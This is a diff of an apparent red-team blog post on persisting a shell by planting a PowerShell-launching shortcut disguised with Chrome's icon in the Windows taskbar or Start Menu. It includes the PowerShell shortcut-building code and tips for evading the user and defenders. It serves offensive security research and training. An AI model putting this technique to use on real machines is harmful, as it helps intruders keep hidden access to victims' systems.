@@ -13,18 +13,22 @@ As a user in a corporate environment, what is one of the first things you do? Af
 As I introduce this concept, I apologize if anyone has already explored this method and might think I am blatantly plagurizing their work, I swear it is not my style. 
 
 ## User-Drive Persistence
-I've seen several different methods of persistence that redteamers (and blackhats) often use to repop a shell on a device that gets shutdown everyday and rebooted the next morning. Senspost's <a href="https://www.twitter.com/_staaldraad">@_staaldraad</a> has a handy tool I was introduced to at Blackhat called <a href="https://github.com/sensepost/ruler">"Ruler"</a>. The original concept was once you had credz you could set up an outlook rule to pop a shell whenever needed by sending a triggered email that would delete itself and run a payload via an external webdev share. Genius! Subj: "bSpence love his shells"
+I've seen several different methods of persistence that redteamers (and blackhats) often use to repop a shell on a device that gets shutdown everyday and rebooted the next morning. Senspost's <a href="https://www.twitter.com/_staaldraad">@_staaldraad</a> has a handy tool I was introduced to at Blackhat called <a href="https://github.com/sensepost/ruler">**"Ruler"**</a>. The original concept was once you had credz you could set up an outlook rule to pop a shell whenever needed by sending a triggered email that would delete itself and run a payload via an external webdev share. Genius!
+### Subj: "bSpence love his shells"
 
 One of the major limitations to this type of persistence is that you have to rely on some user interaction to generate your trigger and get the shell (ie. the user has to start an application). However, if you pick an application like Outlook or other commonly used standard applications, this can be a nice way to hide your shell popping payloads in plain sight, hidden from the user, and even better, hidden from the blue team.
 
 I recently had an engagement with @SpecterOps in which @bluscreenofjeff and @enigma0x3 introduced to me some tradecraft payload cradles in which they use .LNK and .HTA files as links in their phishing emails to get initial breach shells. I don't like to name drop, but I'd be kind of a jerk without mentioning someone like @SubTee who's been the cradle Jedi master for a year or two now. Anyways, after playing with the cradles and thinking about how my blue team might react something slapped me in the face as I looked at the taskbar.
-<<screenshot of your taskbar>>
+
+![IconLocation](/assets/img/taskbar.png)
+Ex: "My Current Taskbar Situation"
+{: .mycenter}
 
 ## Introducing Sticky LNKz
 The epiphany I had was that users often customize their user experience by creating Start Menu and Taskbar shortcuts to execute their favorited applications. The other thing users do is create desktop shortcuts, but I will talk about why the Start Menu and Taskbar are much more covert friendly. These shortcuts get saved on the filesystem as .LNK files since that is essentially what a shortcut is, a link to an executable.
 
 ## The Payload
-Credit to @enigma0x3 for the original powershell LNK generation, but I've added a few things to retrofit this script for taskbar/startmenu usage. In the example below we will be using Google Chrome as a shortcut. Keep in mind this is post-exploitation work to establish User-Based Persistence.
+Credit to @enigma0x3 for the original powershell LNK generation, below I've added a few things to retrofit this script for taskbar/startmenu usage. In the example below we will be using Google Chrome as a shortcut. Keep in mind this is post-exploitation work to establish User-Based Persistence.
 {% highlight html %}
 $LNKName = "C:\Users\<YOUR_USER>\Desktop\Google Chrome.lnk"
 $BinaryPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
@@ -37,6 +41,9 @@ $link.Arguments = $Arguments
 $link.IconLocation = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe, 0";
 $link.Save()
 {% endhighlight %}
+![Google Chrome.Lnk](/assets/img/google_lnkz.png)
+Ex: "Google Chrome.lnk"
+{: .mycenter} 
 ## Snippet Step-by-Step
 The LNKName identifies the save location of the lnk you're generating. You want this to be named exactly like the a taskbar or start menu lnk might look. The BinaryPath establishes powershell.exe as the executable to run instead of the path to chrome.exe
 {% highlight html %}
@@ -60,6 +67,9 @@ The IconLocation here is essential to our .lnk remaining covert and not tipping 
 $link.IconLocation = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe, 0";
 $link.Save()
 {% endhighlight %}
+![IconLocation](/assets/img/icon_path.png)
+Ex: "IconLocation from Chrome.exe"
+{: .mycenter} 
 ## Save Location
 You really have two options when generating the link. Locally on your lab machine and then uploading it to the below locations on the filesystem, or be bold and upload it directly to the compromised host in the start menu or taskbar locations.
 ## Task Bar
@@ -75,6 +85,9 @@ Windows 10/7
 ## Why No Desktop Love?
 As I indicated before you *could* generate a lnk and put it on the user's desktop, but there is some OPSEC considerations that tip off the user. When hovering over the Desktop shortcut the "Location:<PATH_TO_EXECUTABLE>" is shown on hover. This will get you busted pretty quick if the user is paying attention. The taskbar and startmenu location for some reason do not have the same hovers, so the user will not really be tipped off unless he goes exploring the file locations above.
 
+![Location Hover](/assets/img/location_hover.png)
+Ex: "Location: powershell"
+{: .mycenter}
 ## To-Do's
 I'd really like to eventually have the time to put this in a Cobaltstrike Aggressor script. I've already started a preliminary script, but I've been a bit stuck on how to approach it. I figured I could use some common shortcut types like Google, IE, Outlook, etc.. but having aggressor tie it to a hosted payload has given me some problems. I know it can be done, but I just haven't had the time to dig into it.
 The other nice feature I might do is create a powershell script with user-defined input that will generate the link of your choice, but again, this is on my list of things to do.
